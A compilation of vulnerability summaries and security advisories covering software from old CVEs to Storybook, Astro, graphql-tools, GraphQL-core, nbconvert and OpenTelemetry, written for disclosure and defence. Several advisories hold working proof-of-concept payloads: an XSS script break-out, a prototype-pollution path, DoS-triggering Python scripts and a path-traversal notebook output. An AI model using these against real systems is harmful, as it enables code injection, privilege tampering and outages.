phpRank 1.8 does not properly check the return codes for MySQL operations when authenticating users, which could allow remote attackers to authenticate using a NULL password when database errors occur or if the database is unavailable.
Windows NT allows remote attackers to list all users in a domain by obtaining the domain SID with the LsaQueryInformationPolicy policy function via a null session and using the SID to list the users.
Check Point FireWall-1 allows remote attackers to cause a denial of service (high CPU) via a flood of packets to port 264.

ikeyman in IBM IBMHSSSB 1.0 sets the CLASSPATH environmental variable to include the user's own CLASSPATH directories before the system's directories, which allows a malicious local user to execute arbitrary code as root via a Trojan horse Ikeyman class.
Cisco IOS 11.x and 12.0 with ATM support allows attackers to cause a denial of service via the undocumented Interim Local Management Interface (ILMI) SNMP community string.
Mozilla Firefox before 1.0 truncates long filenames in the file download dialog box, which makes it easier for remote attackers to trick users into downloading files with dangerous extensions.
Mozilla Firefox before 1.0 is installed with world-writable permissions on Mac OS X, which allows local users to gain privileges.
Buffer overflow in xaos 3.0-23 and earlier, when running setuid, allows local users to gain root privileges via a long -language option.

OpenSSH 3.6.1 and earlier, when restricting host access by numeric IP addresses and with VerifyReverseMapping disabled, allows remote attackers to bypass "from=" and "user@host" address restrictions by connecting to a host from a system whose reverse DNS hostname contains the numeric IP address.

Multiple buffer overflows in Options Parsing Tool (OPT) shared library 3.18 and earlier, when used in setuid programs, may allow local users to execute arbitrary code via long command line options that are fed into macros such as opt_warn_2, as used in functions such as opt_atoi.

Format string vulnerability in Magic WinMail Server 2.3, and possibly other 2.x versions, allows remote attackers to cause a denial of service (crash) and possibly execute arbitrary code via format string specifiers in the PASS command.
Microsoft SQL Server 7, 2000, and MSDE allows local users to gain privileges by hijacking a named pipe during the authentication of another user, aka the "Named Pipe Hijacking" vulnerability.

Outlook 2003, when replying to an e-mail message, stores certain files in a predictable location for the "src" of an img tag of the original message, which allows remote attackers to bypass zone restrictions and exploit other issues that rely on predictable locations, as demonstrated using a shell: URI.

Microsoft Outlook 2003 allows remote attackers to bypass the default zone restrictions and execute script within media files via a Rich Text Format (RTF) message containing an OLE object for the Windows Media Player, which bypasses Media Player's setting to disallow scripting and may lead to unprompted installation of an executable when exploited in conjunction with predictable-file-location exposures such as CVE-2004-0502.
Ethereal 0.10.3 allows remote attackers to cause a denial of service (crash) via certain SIP messages between Hotsip servers and clients.
The AIM dissector in Ethereal 0.10.3 allows remote attackers to cause a denial of service (assert error) via unknown attack vectors.
The SPNEGO dissector in Ethereal 0.9.8 to 0.10.3 allows remote attackers to cause a denial of service (crash) via unknown attack vectors that cause a null pointer dereference.
Buffer overflow in Linux splitvt 1.6.3 and earlier allows local users to gain root privileges via a long password in the screen locking function.
Remote attackers can cause a denial of service in FTP by issuing multiple PASV commands, causing the server to run out of available ports.
Denial of service in Slmail v2.5 through the POP3 port.
All records in a WINS database can be deleted through SNMP for a denial of service.
Buffer overflow in Xt library of X Windowing System allows local users to execute commands with root privileges.
Buffer overflow in AIX dtterm program for the CDE.
Vulnerability in runpriv in Indigo Magic System Administration subsystem of SGI IRIX 6.3 and 6.4 allows local users to gain root privileges.

Low-privileged attackers can supply other users' prompt template and dataset ids to trigger large language model evaluation runs, write result rows into airag_ext_data, and change dataset status.

Low-privileged attackers can send PUT or POST requests to /airag/prompts/edit with a template id to overwrite prompt text and model parameters created by administrators or other users.

Multiple buffer overflows in (1) iso2022jp.c or (2) shiftjis.c for Courier-IMAP before 3.0.0, Courier before 0.45, and SqWebMail before 4.0.0 may allow remote attackers to execute arbitrary code "when Unicode character is out of BMP range."
Directory traversal vulnerability in ITAfrica WEBactive HTTP Server 1.00 allows remote attackers to read arbitrary files via a .. (dot dot) in a URL.
Bajie HTTP JServer 0.78, and other versions before 0.80, allows remote attackers to execute arbitrary commands via shell metacharacters in an HTTP request for a CGI program that does not exist.

UploadServlet in Bajie HTTP JServer 0.78, and possibly other versions before 0.80, allows remote attackers to execute arbitrary commands by calling the servlet to upload a program, then using a ... (modified ..) to access the file that was created for the program.
Linux kernel 2.4 and 2.2 allows local users to read kernel memory and possibly gain privileges via a negative argument to the sysctl call.
Race condition in ptrace in Linux kernel 2.4 and 2.2 allows local users to gain privileges by using ptrace to track and modify a running setuid process.

**Summary:** The Storybook dev server exposes its WebSocket authentication token to any client that can load its HTML pages. Any host on a LAN can open a Storybook app by IP address, and therefore obtain the token. The WebSocket can be used to inject code into story files or to create new files. Under the right circumstances, an attacker can execute code on the machine of a developer connected on the same LAN.

## Who is impacted?

You are impacted if you run a Storybook dev server whilst connected on an untrusted local network, or to a WiFi access point posing as a trusted network. The impact of this advisory is more important if you have the Vitest addon installed and are using an old version of Vitest.

You are not impacted if:

- You run a dev server in an environment that other devices on your network cannot reach (e.g. a container that does not publish the Storybook port, or publishes it only on `127.0.0.1`)
- You run a dev server whilst connected to a trusted local network
- You serve a built version of Storybook on your machine

## Recommended actions

### Upgrade Storybook

Storybook has released patched versions of all affected major Storybook versions that fix all the vulnerabilities necessary for the worst-case scenario above to occur. 

Upgrade to a patched version listed below before running `storybook dev` again. If you cannot upgrade immediately, do not run an affected Storybook dev server until you can apply the fix.

- 11.0.0-alpha.6
- 10.6.2
- 9.1.21
- 8.6.19

### Review potentially breaking changes

Due to the exceptional nature of the reported vulnerabilities, the Storybook team has decided to change the default behavior of Storybook, including versions 8 and 9, for several network-related features that are not essential to most Storybook users' workflow. If your team relies on the affected features, this document explains how to fall back to the previous behavior.

#### Storybook now only listens on `127.0.0.1` by default

By default, the Storybook dev server no longer binds to all network interfaces on your machine. It only binds to the loopback address `127.0.0.1`. You can still open it at `http://localhost:6006`. This prevents other devices on the same network from seeing your Storybook server.

To share a Storybook with others, consider publishing it to Chromatic (free). To share it on a LAN without exposing the dev server, build a static Storybook with `storybook build` and serve the output folder with any static file server.

To share a live Storybook running in dev mode, you can use the `--host` CLI option to bind to the LAN IP you want to share Storybook on, e.g. `storybook dev --host 192.168.0.110`. Host and origin validation stays enabled with this option. If you use `--host 0.0.0.0` instead, also set `core.allowedHosts` to the hostnames you will use. Without it, host and origin validation is disabled, and Storybook shows a warning and asks you to confirm before it starts.

Consider using a firewall to restrict incoming packets to known colleague IPs, and avoid using `--host` on an untrusted WiFi network.

#### The Vitest addon now disables `browser.api.allowWrite` and `browser.api.allowExec`

Storybook no longer allows code running in Vitest Browser mode to write to the developer’s machine or execute other processes. In the unlikely scenario that you rely on this capability in your tests, you can manually re-enable these APIs in your Vitest config.

#### The `saveStoryRequest` event validates input more strictly

Storybook strengthened input validation in `saveStoryRequest`, so addons and the Storybook UI can now only write serialized args and story titles. It is no longer possible to exploit input validation weaknesses to e.g. write `play` functions with a custom addon.

If you develop an addon that writes or edits files on users’ behalf, reach out to the Storybook team to get advice on security best practice.

## Disclosure timeline

On August 19th, the Storybook team received a responsible disclosure showing that the WebSocket token can be stolen by an attacker sharing a LAN with a Storybook dev server.

The disclosure identified several actions an attacker can do. An attacker can bypass input validation to write a payload in a story file.

They can then trigger a test run via the WebSocket. If the Vitest addon is installed, the payload can exploit a Vitest API to write other files, with more exploit logic to the user’s filesystem.

Depending on the exploit content, where the file is written, and what software the developer uses, that exploit could then be executed.

cves.summary:
## Summary

Astro's JSX and MDX rendering pipeline treated string children of `<script>` and `<style>` elements as trusted HTML. When a dynamic value was passed through a JSX expression, such as `<script>{value}</script>`, an attacker-controlled value containing `</script>` or `</style>` could terminate the element and inject arbitrary HTML and JavaScript.

Other JSX expression contexts escaped dynamic strings automatically. This behavior was limited to `<script>` and `<style>` children rendered through Astro's `astro:jsx` renderer, including MDX components.

## Details

The affected rendering paths marked all string children of `<script>` and `<style>` elements as safe HTML, without distinguishing literal content generated by the compiler from dynamic expression values. An application was vulnerable when attacker-controlled data, such as a query parameter or CMS field, was interpolated directly into one of these elements.

For example, a value containing `</script><script>alert(1)</script>` passed to `<script>{value}</script>` was emitted without escaping. The browser interpreted the first closing tag as markup and executed the injected script.

The fix preserves raw rendering for literal script and style content while escaping dynamic string children like other JSX expression values.

## Impact

Affected applications could be vulnerable to reflected or stored cross-site scripting. Exploitation required an application to pass attacker-controlled data directly as a dynamic child of a `<script>` or `<style>` element in MDX or through the `astro:jsx` runtime. Successful exploitation allowed arbitrary JavaScript execution in the victim's browser under the application's origin.

## Patches

This issue is patched in `astro@7.3.2`.

## Workarounds

Do not interpolate untrusted dynamic values directly into `<script>` or `<style>` element children. Applications that cannot upgrade should validate and contextually encode these values before rendering them.

## Credit

Reported by [@RKasai127](https://github.com/RKasai127).

cves.summary:
## Report metadata

| Field | Value |
| --- | --- |
| Package | `@graphql-tools/utils` (npm, `pkg:github/ardatan/graphql-tools`) |
| Repository | https://github.com/ardatan/graphql-tools |
| Component | `mergeIncrementalResult` / `setObjectKeyPath` (`packages/utils/src/mergeIncrementalResult.ts`) |
| Vulnerability class | Prototype pollution (via unvalidated object path traversal) |
| Verified against | Source read at `134d67ae36a559651f43ec7fe4a9da76f4a00c2b`; `master` HEAD `ccca0ff0dc8ea20726fd116b2f19a38709c30e62`; published npm builds 10.10.0, 10.10.1, 11.0.0, 12.0.0, 12.0.1 |
| Affected versions | `@graphql-tools/utils` >= 10.10.1 through the scanned 12.0.0 source; introduced by `fbb58b51c4993ba9680ce6c2ef7203ab3a142713` ("remove dset dependency"). 12.0.1 also reproduces. 10.10.0 does not. |
| API surface | Public, documented export (`packages/utils/src/index.ts:55`) |
| Affected in default configuration | Yes — no options are involved; the forbidden-key check in `setObjectKeyPath` is the only defense and it is on by default |

## Summary

`mergeIncrementalResult` merges an incremental GraphQL response part into an accumulated execution result by walking `['data', ...incrementalResult.path]` and assigning at the resolved location. `setObjectKeyPath` tries to reject dangerous segments with strict string equality against `'__proto__'`, `'constructor'` and `'prototype'` (lines 50-52 and 60-62), but it never validates that a path segment is a primitive string or number. A JSON path segment such as `["__proto__"]` is an array object, so `["__proto__"] !== '__proto__'` and the guard passes; the very next statement does `current[key]`, whose `ToPropertyKey` coercion turns that array into the string key `"__proto__"` and resolves `Object.prototype`. The following, innocuous-looking segment is then assigned directly onto `Object.prototype`.

In a consuming app, `incrementalResult` is the response part being merged — data parsed from an upstream `@defer`/`@stream` multipart or incremental-delivery response from another GraphQL server or transport. The `ExecutionResult` TypeScript annotation is not a runtime check, so a malicious, compromised, or MITM'd upstream can choose the `path` value and therefore choose global prototype keys and values in the gateway or client process.

Comparable paths through the same helper, for contrast:

- Plain string segment `"__proto__"` -> blocked by strict equality, lines 50-52 (confirmed by a control case in testing)
- Array segment `["__proto__"]` -> **unsafe: passes the guard at lines 50-52, then coerced to the `__proto__` key at lines 53-57**
- Same operation in 10.10.0 and earlier, which used `dset` -> not exploitable (0/5 attack payloads succeeded)

## Impact

A malicious incremental GraphQL response can add arbitrary properties with attacker-chosen values to `Object.prototype` in the consuming Node.js process. Because every plain object inherits from it, this can change authorization and configuration checks and the behavior of unrelated code elsewhere in the process — a networked PoC set `Object.prototype.isAdmin = true` and `Object.prototype.ownerEmail`, after which a consumer-style check `opts.isAdmin === true` on a freshly created `{}` returned `true`.

The delta over the safe behaviour: without this traversal flaw, a hostile upstream response can only influence the GraphQL data returned to the caller — a bounded, in-band effect. With `path: [["__proto__"], "isAdmin"]`, the write lands on `Object.prototype`, escaping the response object entirely and affecting objects created later and code that never touches the response.

Scoring note: **this report deliberately carries no CVSS vector.** No score was produced for it, and exploitability depends on the consuming application's data flow — specifically whether it merges incremental results from an upstream it does not control, and how much it relies on inherited defaults. Consumers who are **not** affected: anything on `@graphql-tools/utils` 10.10.0 or earlier (the `dset`-based implementation blocked all tested payloads); processes that freeze `Object.prototype`; and consumers that runtime-validate incremental `path` segments to primitives before calling the helper. Note also that `graphql-tools`' own production code does not call `mergeIncrementalResult` directly — it is exported for consumers assembling incremental transport results.

## Preconditions

1. The consumer calls the public `mergeIncrementalResult` helper on incremental payloads received from another GraphQL server or other untrusted transport. No special options are needed.
2. The incremental payload is not runtime-validated to contain only primitive string/number `path` segments before the call. This is the default: `packages/utils/src/index.ts:55` exports the helper directly, with no runtime validation and no documented warning, and the behaviour is not documented as a caller responsibility.
3. The attacker can return a malformed incremental `path` value — i.e. controls, has compromised, or can MITM the upstream subgraph/transport.
4. The process has not frozen `Object.prototype`.

This requires **no** non-standard usage, monkey-patching, or unusual configuration: the documented happy path of the exported helper is affected. The only defense present in the code is the strict-equality forbidden-key check added at lines 50 and 60, which itself shows the author treats these path segments as untrusted input. No documentation warning about the trust requirement was found (documentation review is limited to the exported symbol at `packages/utils/src/index.ts:55`; a broader docs audit is **not verified**).

## Data flow

1. **Source** — the attacker-controlled `incrementalResult.path`, taken from the object passed to the public merge helper, is spread into the key path: `const path = ['data', ...(incrementalResult.path ?? [])];` ([`packages/utils/src/mergeIncrementalResult.ts:12`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L12)).
2. **Propagation** — `setObjectKeyPath` compares the unvalidated segment against the forbidden strings with `===` only; a non-primitive segment is never equal to any of them, so it passes unchanged ([`packages/utils/src/mergeIncrementalResult.ts:48-52`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L48-L52)).
3. **Sink** — `current[key]` performs `ToPropertyKey` coercion, turning the array segment `["__proto__"]` into the key `"__proto__"` and resolving `Object.prototype`; the following segment is then assigned on that resolved object: `current[finalKey] = existingValue != null ? mergeDeep([existingValue, value]) : value` ([`packages/utils/src/mergeIncrementalResult.ts:53-57`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L53-L57), sink at [`:59-64`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/mergeIncrementalResult.ts#L59-L64)).
4. **Reachability** — the entry point is the public API `mergeIncrementalResult({ incrementalResult, executionResult })`, exported directly at [`packages/utils/src/index.ts:55`](https://github.com/ardatan/graphql-tools/blob/134d67ae36a559651f43ec7fe4a9da76f4a00c2b/packages/utils/src/index.ts#L55) for consumers that assemble incremental transport results. Testing confirmed the `data`, `items` (`@stream`) and recursive `incremental[]` branches are all affected.

## Vulnerable code

`packages/utils/src/mergeIncrementalResult.ts`, lines 12-64 at `134d67ae36a559651f43ec7fe4a9da76f4a00c2b` (extract; the `...` markers are elisions of intervening lines, not source text):

```ts
const path = ['data', ...(incrementalResult.path ?? [])];
...
const key = keyPath[i];
if (key === '__proto__' || key === 'constructor' || key === 'prototype') return;
if (current[key] == null) current[key] = ...;
current = current[key];
...
current[finalKey] = existingValue != null ? mergeDeep([existingValue, value]) : value;
```

- The guard line (`key === '__proto__' || ...`, lines 50-52) is the intended defense; it is safe only for primitive string segments.
- `current = current[key]` (lines 53-57) is where a non-primitive segment is coerced into a forbidden key — this is the traversal that escapes the response object.
- `current[finalKey] = ...` (lines 59-64) is the sink: the write that lands on `Object.prototype`.
- The final-segment check at lines 60-62 repeats the same strict-equality pattern and has the same weakness.

## Reproduction

**Verified — reproduced dynamically, not only by inspection.** Three independent reproductions were run:

1. **Source level.** `packages/utils/src/{mergeIncrementalResult,mergeDeep,helpers}.ts` were copied from `master` unchanged except for retargeting relative `.js` import specifiers to `.ts`, then run under `node --experimental-strip-types --test`. 5/5 tests pass, including a control proving that the plain-string `"__proto__"` segment **is** blocked, while the payload `{"path":[["__proto__"],"polluted"],"data":{"pwned":true}}` sets `Object.prototype.polluted = {pwned: true}` and leaves the `executionResult` as `{"data":{}}`. The `data`, `items` (`@stream`) and recursive `incremental[]` branches are all affected.
2. **Published artifacts.** The same attacks were run against the real npm dist builds: 10.10.0 = 0/5 attacks succeed (still uses `dset`, which blocks it); 10.10.1, 11.0.0, 12.0.0 and 12.0.1 = 5/5 attacks succeed. This differential confirms the affected range and that `fbb58b51c4993ba9680ce6c2ef7203ab3a142713` introduced the issue; that commit is still the last one touching the file on `master`, so HEAD (`ccca0ff0dc8ea20726fd116b2f19a38709c30e62`) is unfixed.
3. **Real call site over the network.** A local HTTP server returned a spec-shaped `multipart/mixed` `@defer` response whose deferred patches carry `path: [["__proto__"],"isAdmin"]`. The client only `JSON.parse()`d the chunks and called the public `mergeIncrementalResult()`. Afterwards `Object.getOwnPropertyNames(Object.prototype)` contains `isAdmin` and `ownerEmail`, `({}).isAdmin === true`, and a consumer-style check `opts.isAdmin === true` on a fresh `{}` returns `true`.

Minimal standalone reproduction:

```ts
import { mergeIncrementalResult } from '@graphql-tools/utils';

const executionResult = { data: {} };
const incrementalResult = JSON.parse('{"path":[["__proto__"],"polluted"],"data":"yes"}');
mergeIncrementalResult({ incrementalResult, executionResult });
console.log(({} as any).polluted); // expected vulnerable output: yes
delete (Object.prototype as any).polluted;
```

Steps: run the above under Node against the built `@graphql-tools/utils` package, then inspect a freshly created object after the merge.

- **Expected:** the helper rejects the malformed path; `({} as any).polluted` remains `undefined` and no property is added to `Object.prototype`.
- **Actual:** the write lands on `Object.prototype`; `({} as any).polluted` is `"yes"` on a fresh object, while `executionResult` is left as `{"data":{}}`.

## Suggested remediation

Validate the type of every path segment before it is used for property access, so that only primitive string/number keys ever reach bracket access — and compare against the forbidden names only after that validation.

```ts
function isSafeKey(key: unknown): key is string | number {
  if (typeof key !== 'string' && typeof key !== 'number') return false;
  return key !== '__proto__' && key !== 'constructor' && key !== 'prototype';
}

// walking segment
const key = keyPath[i];
if (!isSafeKey(key)) return;
if (!Object.prototype.hasOwnProperty.call(current, key) || current[key] == null) {
  current[key] = ...;
}
current = current[key];

// final segment
if (!isSafeKey(finalKey)) return;
current[finalKey] = existingValue != null ? mergeDeep([existingValue, value]) : value;
```

A stronger variant, if it fits the project's style: build intermediate containers with `Object.create(null)` and use own-property access (`Object.prototype.hasOwnProperty.call`) throughout the walk, so an inherited property can never be resolved or written even if a future guard is missed.

Notes:

- The final-segment check (lines 60-62) needs the same treatment as the walking check (lines 50-52); patching only one leaves the other reachable.
- All three branches that reach this sink — `data`, `items` (`@stream`) and the recursive `incremental[]` handling — are affected by the same helper and are fixed together by validating in `setObjectKeyPath`.
- Nothing outside this helper appears to need changing: 10.10.0 and earlier, which delegated to `dset`, were not exploitable by any of the tested payloads, so the regression is confined to the hand-rolled traversal added in `fbb58b51c4993ba9680ce6c2ef7203ab3a142713`.
- Whether a released fix or backport policy is wanted for the 10.x and 11.x lines is the maintainers' call; no fix, advisory, or upstream issue currently exists for this.

Suggested regression test alongside the existing tests for `mergeIncrementalResult` (exact spec file path: **unknown** — not identified in this review): assert that merging `{"path":[["__proto__"],"polluted"],"data":"yes"}` leaves `({} as any).polluted` `undefined` and `Object.getOwnPropertyNames(Object.prototype)` unchanged, with a paired control asserting the plain-string `"__proto__"` segment is still rejected, and equivalents for an object-valued segment (e.g. `{"toString":() => "__proto__"}`-style coercion) and for the `items`/`incremental[]` branches.

## Resolution

Fixed in `@graphql-tools/utils@12.0.2`, which is published on npm. `setObjectKeyPath` rejects a path unless every segment is a primitive string or number, and still blocks `__proto__`, `constructor`, and `prototype`. Upgrade to `>=12.0.2`.

cwe.name: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

cves.summary:
### Summary

The parser's `max_tokens` limit — the documented defence against oversized GraphQL
documents — did not count comment tokens. A document padded with comments could
therefore pass a `max_tokens` check of any size while still allocating one `Token`
object per comment, all of which stay reachable for the lifetime of the parsed
document. A 38 MB comment-padded payload allocated roughly 92 MB of additional
resident memory with `max_tokens=5` in force.

### Details

`Lexer.lookahead()` reads tokens one at a time and skips over comments, returning only
the first non-comment token. Each skipped comment is nevertheless fully tokenized,
allocated as a `Token` object, and linked into the persistent token list via
`token.next` / `token.prev` — the chain that powers source-location reporting, and
which is retained as long as the document is.

`Parser.advance_lexer()` incremented the token counter only for the tokens the lexer
actually returned. Comments were therefore invisible to the accounting, and
`max_tokens` bounded only the *non-comment* tokens.

The practical consequence is a gap between what users reasonably believe `max_tokens`
protects and what it did protect. The limit was not broken for ordinary documents —
real tokens were still capped correctly — so the shortfall was not observable without
specifically testing comment padding.

As with the companion issue, the payload compresses extremely well (`# c\n` repeated),
so body-size limits and WAF inspection applied to the compressed request do not see
its true size, while the framework decompresses it in memory before the parser is
reached.

### Proof of concept

```python
import gc
import resource
from graphql import parse

# 100,000 comments, a 5-token query, and max_tokens=5 — accepted.
query = "# c\n" * 100_000 + "{ a }"
parse(query, max_tokens=5)          # no error raised

# Memory amplification.
big = "# padding comment used to amplify memory per token\n" * 500_000 + "{ a }"
gc.collect()
before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
parse(big, max_tokens=5)            # ~38 MB source
after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
print(f"RSS delta: +{(after - before) / 1024:.0f} MB")
```

Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64: the 391 KB payload
parsed in 127 ms, and the 38.1 MB payload produced an RSS delta of **+92 MB** — about
2.4× the source size, on top of the source string itself.

### Impact

Denial of service through memory exhaustion. A modest number of concurrent requests
can push a worker past a typical 256 MB or 512 MB container limit and trigger an
OOM kill. No authentication is required, and no data is disclosed or modified.

Depth limiters and complexity analyzers do not help: they run on the AST after parsing
has already succeeded, and the document contains only five real tokens.

### Patches

Fixed in **3.2.12** and **3.3.0rc1**.

`Parser.advance_lexer` now counts every token consumed, including the comment tokens
the lexer skips between the previously focused token and the new one, and including
the advance onto EOF so that trailing comments are covered. `max_tokens` therefore now
bounds every `Token` the parser allocates.

Note the behaviour change: **comments now count toward `max_tokens`.** A
comment-heavy document that was previously accepted may now be rejected. If you parse
documents containing substantial comments — SDL files with documentation comments, for
instance — and you set `max_tokens`, you may need to raise the limit. The
`token_count` attribute of a parsed document likewise now includes comments.

### Workarounds

If you cannot upgrade, apply a request body-size limit to the **decompressed** body
before the document reaches `parse()`.

Such a limit is worth keeping after upgrading as well: `max_tokens` is one guard among
several and bounds the token count, not the overall cost of a request.

### References

- GraphQL specification § 2.1.4 — Comments

### Credits

Reported by @BZHunt, who also reviewed the fixes
before release. In memory of ZaX, who was the driving force behind this discovery.

### Summary

The `OverlappingFieldsCanBeMerged` validation rule can be driven into quadratic — and
in the worst case `O(n²·m²)` — running time by a small, highly compressible query. A
single 364 KB document can occupy one CPU core for over five minutes during
*validation*, before any resolver runs. Because the rule is part of `specified_rules`
and therefore enabled by default, every GraphQL-core based server is affected at
default settings.

### Details

`OverlappingFieldsCanBeMerged` compares every pair of fields that share a response
name and recurses into their sub-selections. The memoization added for
CVE-2023-26144 (`GHSA-9pv7-vfvm-6vr7`) is keyed by **named fragment** identity, so it
does not cover this path: inline fragments are flattened into the parent selection
set before the cache is consulted, and therefore every pair is re-compared from
scratch at every nesting level.

Repeating an inline fragment that selects the same response name at two nesting
levels multiplies the two effects. There was no comparison budget and no validation
timeout, so the rule ran to completion regardless of cost.

The cost is incurred in the **validation phase**, which is what makes this hard to
defend against from outside the library: query-depth limiters, complexity analyzers
and cost estimators all operate on the parsed document *after* validation, and the
malicious document is trivially shallow (depth 3, complexity 1). The payload is also
one short string repeated many times, so it compresses to a few kilobytes and slips
past body-size limits and WAF inspection that only see the compressed request.

### Proof of concept

```python
import time
from graphql import build_schema, parse, validate

schema = build_schema(
    "type Query { field: Node } type Node { f: Node, g: Node, x: String }"
)

def gen(n: int, m: int) -> str:
    inner = " ".join(["... on Node { x }"] * m)
    outer = " ".join([f"... on Node {{ f {{ {inner} }} }}"] * n)
    return f"{{ field {{ {outer} }} }}"

query = gen(200, 100)          # 364 KB, gzips to a few KB
document = parse(query)
start = time.perf_counter()
validate(schema, document)      # returns no errors — it just burns CPU
print(f"{(time.perf_counter() - start):.0f}s")
```

Measured on GraphQL-core 3.2.8 / CPython 3.12 / Linux x86_64:

| n | m | query size | validation time |
|---|---|---|---|
| 20 | 20 | 7.6 KB | 0.16 s |
| 50 | 50 | 46 KB | 5.2 s |
| 100 | 100 | 182 KB | 81 s |
| 200 | 100 | 364 KB | **319 s** |

Doubling `n` at fixed `m` quadruples the time, as expected for a quadratic outer loop
driving a quadratic inner walk.

### Impact

Denial of service. One request pins one worker process for minutes; because CPython
holds the GIL for this pure-CPU work, a handful of concurrent requests can saturate a
typical multi-worker deployment. No authentication is required, and no data is
disclosed or modified.

### Patches

Fixed in **3.2.12** and **3.3.0rc1**.

Validation now enforces a per-document comparison budget. Once
`MAX_FIELD_COMPARISONS` (default `250_000`) pairwise comparisons have been made, the
rule aborts and reports a `GraphQLError` instead of running to completion:

> Query is too complex to validate for overlapping fields: exceeded 250000 field
> comparisons. Validation was aborted.

The default is far above what any realistic query reaches. It is a module-level
constant and can be raised or lowered:

```python
from graphql.validation.rules import overlapping_fields_can_be_merged

overlapping_fields_can_be_merged.MAX_FIELD_COMPARISONS = 1_000_000
```

Note the behaviour change: a pathological query that previously validated — slowly —
now produces a validation error.

### Workarounds

If you cannot upgrade, reject oversized documents before they reach `validate()`.
Note that a request body-size limit must be applied to the **decompressed** body to be
effective here, since the payload is highly compressible. Removing
`OverlappingFieldsCanBeMergedRule` from the rule set is *not* a safe workaround: it is
a correctness rule required by the specification.

A body-size limit remains worthwhile after upgrading — the comparison budget bounds
this specific rule, not overall request cost.

### Credits

Reported by @BZHunt, who also reviewed the fixes
before release. In memory of ZaX, who was the driving force behind this discovery.

Independently found and diagnosed by @bcmyguest, who
also proposed a fix.

### Summary

nbconvert <= v7.17.1 has an arbitrary file write vulnerability due to a path traversal in ipynb cell output metadata, more specifically on the filename attribute.

Vulnerable converters : `--to markdown`, `--to latex`, `--to rst`, `--to asciidoc`.

In `ExtractOutputPreprocessor`, `extractoutput.py:116-119` joins attacker-controlled  `path` to `output_files_dir` with no canonicalization check, enabling arbitrary file write.

This is a sibling vulnerability of https://github.com/advisories/GHSA-4c99-qj7h-p3vg.

### Impact

If a victim runs nbconvert on a malicious ipynb file, it can create some files with arbitrary data in arbitrary locations, i.e. override authorized_keys.

Note that running the cell with jupyter overrides the output, so it would "clean up" malicious cells.

### PoC

In a ipynb file:

```json

"cells": [{
        "cell_type": "code", "id": "abc123", "execution_count": 1,
        "metadata": {}, "source": "# PoC",
        "outputs": [{
            "output_type": "display_data",
            "metadata": {
                "filename": "../../../tmp/PWNED.png"  # ← traverses outside output_dir
            },
            "data": {
                # minimal valid PNG (1×1 pixel)
                "image/png": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
            }
        }]
    }]

```

### Patches

Fixed in 
- https://github.com/jupyter/nbconvert/commit/ce4bd99aec31d81d759fa8eeb8643179392ec66f
- [7.17.2](https://github.com/jupyter/nbconvert/releases/tag/v7.17.2)

## Summary
`TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.

## Affected component / version
- Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`).
- Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between.
- Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.

## Details

1. The header reaches the parser without any length check:

```python
# opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57
tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size
if tracestate_headers is None:
    tracestate = None
else:
    tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61)
```

2. The split pattern and the parser:
```python
# opentelemetry-api/src/opentelemetry/trace/span.py:45
_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split
_delimiter_pattern = re.compile(r"[ \t]*,[ \t]*")      # <-- (line 46) starts with an unbounded [ \t]*

# span.py:382
@classmethod
def from_header(cls, header_list: list[str]) -> TraceState:
    pairs = {}  # type: dict[str, str]
    for header in header_list:
        members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on "a=b" + " " * N + "x"
        for member in members:
            if not member:
                continue
            match = _member_pattern.fullmatch(member)
            if not match:
                _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)
                    "Member doesn't match the w3c identifiers format %s",
                    member,
                )
                return cls()
            ...
```

`re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.

3. The sibling propagator already has the missing guard:
```python
# baggage/propagation/__init__.py:68
_MAX_HEADER_LENGTH = 8192
...
if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent
    _logger.warning(...)
    return context
```

A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s.
Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: "a=b" + N spaces + "x"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower). 

